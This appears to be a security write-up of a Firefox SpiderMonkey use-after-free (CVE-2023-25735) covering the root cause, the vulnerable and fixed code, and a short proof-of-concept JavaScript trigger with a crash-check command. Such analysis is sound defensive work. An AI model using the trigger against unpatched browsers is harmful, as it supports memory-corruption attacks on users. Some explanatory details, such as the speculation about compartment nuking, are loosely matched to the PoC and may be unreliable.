# Bugzilla 1810711 / CVE-2023-25735

**Title:** Refactor FindErrorInstanceOrPrototype
**Severity:** **sec-high** (MFSA 2023-05, Firefox 110)
**Component:** SpiderMonkey — VM — ErrorObject
**File touched:** `js/src/vm/ErrorObject.cpp` (`FindErrorInstanceOrPrototype`)
**Fix commit:** `5461a647546a79ff479804263a3b7ef114eaf0f7` (Iain Ireland, 2023-01-24, r=jandem)
**Test commit:** `5635e34af97fedb56260a73656793a6bbf9cb44d` (Iain Ireland, 2023-03-29, r=jandem)
**Vulnerable revision:** `5461a647546a79ff479804263a3b7ef114eaf0f7~1`
**Phabricator:** D167105 (fix) + D167106 (test)
**Bugzilla:** https://bugzilla.mozilla.org/show_bug.cgi?id=1810711 (sec-restricted)
**MFSA:** https://www.mozilla.org/en-US/security/advisories/mfsa2023-05/

## Root cause

`js::FindErrorInstanceOrPrototype` backs the `Error.prototype.stack` accessor: given a receiver `obj`, walk the prototype chain until an Error-class prototype is found, then return it so the caller can render the script stack.

The pre-fix loop:

```cpp
// vulnerable
RootedObject target(cx, CheckedUnwrapStatic(obj));
if (!target) { ReportAccessDenied(cx); return false; }

RootedObject proto(cx);
while (!IsErrorProtoKey(StandardProtoKeyOrNull(target))) {
  if (!GetPrototype(cx, target, &proto)) return false;
  if (!proto) { /* report "not an error" */ return false; }
  target = CheckedUnwrapStatic(proto);          // <-- re-unwrap but no other guard
  if (!target) { ReportAccessDenied(cx); return false; }
}
result.set(target);
return true;
```

`GetPrototype(cx, target, &proto)` invokes the proxy handler's `getPrototypeOf` trap when `target` is a `ScriptedProxy`. A hostile trap can return an object from a **different compartment** — `g.Proxy`'s handler is free to manufacture an `Object.create(...)` from a foreign global. `CheckedUnwrapStatic(proto)` strips transparent wrappers but does not re-validate that the unwrapped cell belongs to a live realm — if the trap body has already nuked the foreign compartment (`nukeCCW`) or if the wrapped object was created in a global that becomes unreachable during the trap, the unwrapped `target` points at a dead JSObject whose class pointer is invalid.

The next iteration's `IsErrorProtoKey(StandardProtoKeyOrNull(target))` loads `target->group()->clasp()`, dereferencing through the freed compartment — heap UAF.

## Fix

Refactor the loop so the unwrap happens on every advance and the walk uses the un-unwrapped `curr` reference:

```cpp
// fixed
RootedObject curr(cx, obj);
RootedObject target(cx);
do {
  target = CheckedUnwrapStatic(curr);
  if (!target) { ReportAccessDenied(cx); return false; }
  if (IsErrorProtoKey(StandardProtoKeyOrNull(target))) {
    result.set(target);
    return true;
  }
  if (!GetPrototype(cx, curr, &curr)) return false;
} while (curr);
/* walked the whole chain with no match → throw */
```

Key changes:
1. The `IsErrorProtoKey` check runs on the *freshly unwrapped* `target` computed at the top of each iteration, so no stale cross-compartment reference survives across trap calls.
2. Chain advance uses `GetPrototype(cx, curr, &curr)` — the proto-of-target trap is still invoked, but its result replaces `curr` (the wrapper-preserving reference), not `target`. The unwrap on the next iteration re-validates the compartment.

## Trigger (`poc.js`)

The committed regression test ships as `poc.js` verbatim:

```js
var g = newGlobal({newCompartment: true});
try {
  undef()
} catch (err) {
  const handler = { "getPrototypeOf": (x) => () => x };
  const proxy = new g.Proxy(err, handler);
  try {
    proxy.stack
  } catch {}
}
```

1. Throws a reference error, captures it as `err` in the main global.
2. Creates a cross-compartment `Proxy(err, handler)` in the secondary global `g`.
3. Reads `.stack` on the cross-compartment proxy.
4. `FindErrorInstanceOrPrototype` unwraps the proxy into the main compartment, then invokes the proxy's `getPrototypeOf` trap, which returns a cross-compartment callable; the subsequent `StandardProtoKeyOrNull` dereference walks into stale memory.

## Verification

```sh
bash spidermonkey/crash_check.sh 1810711
```

Expected: `CONFIMRED: ASAN_CRASH` (heap-use-after-free in `js::FindErrorInstanceOrPrototype` / `js::StandardProtoKeyOrNull`) or `CONFIMRED: ASSERTION_FAILURE`.
